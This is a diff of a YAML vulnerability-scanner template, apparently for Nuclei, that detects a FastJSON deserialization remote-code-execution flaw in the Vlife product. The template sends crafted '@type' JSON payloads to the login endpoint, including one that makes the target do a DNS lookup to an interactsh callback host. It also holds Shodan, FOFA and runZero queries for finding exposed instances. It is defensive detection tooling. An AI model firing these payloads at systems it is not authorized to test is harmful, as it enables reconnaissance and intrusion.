@@ -1,5 +1,4 @@
 id: vlife-fastjson-rce
-
 info:
   name: Vlife FastJSON - Remote Code Execution
   author: omarkurt
@@ -13,17 +12,15 @@ info:
     cvss-score: 9.8
     cwe-id: CWE-502
   metadata:
-    runzero-review: REJECT/2026-03-13/uses interactsh
-    verified: true
+    runzero-match: any(each(service["html.titles"]), {# matches "(?i)vlife"})
+    fofa-query: http.title:"vlife"
     max-request: 2
-    vendor: vlife
     product: vlife
     shodan-query: http.title:"vlife"
-    fofa-query: http.title:"vlife"
+    vendor: vlife
+    verified: true
   tags: vlife,fastjson,rce,vuln
-
 flow: http(1) && http(2)
-
 http:
   - raw:
       - |
@@ -32,7 +29,6 @@ http:
         Content-Type: application/json
 
         {"@type":"java.lang.Runtime"}
-
     matchers:
       - type: dsl
         name: eid
@@ -41,7 +37,6 @@ http:
           - 'contains_all(body, "com.alibaba.fastjson.JSONException", "autoType is not support", "java.lang.Runtime")'
         condition: and
         internal: true
-
   - raw:
       - |
         POST /vlife/login HTTP/1.1
@@ -49,16 +44,13 @@ http:
         Content-Type: application/json
 
         {"@type":"java.net.Inet4Address","val":"{{interactsh-url}}"}
-
     matchers-condition: and
     matchers:
       - type: word
         part: interactsh_protocol
         words:
           - "dns"
-
       - type: word
         part: body
         words:
           - "com.alibaba.fastjson.JSONException"
-
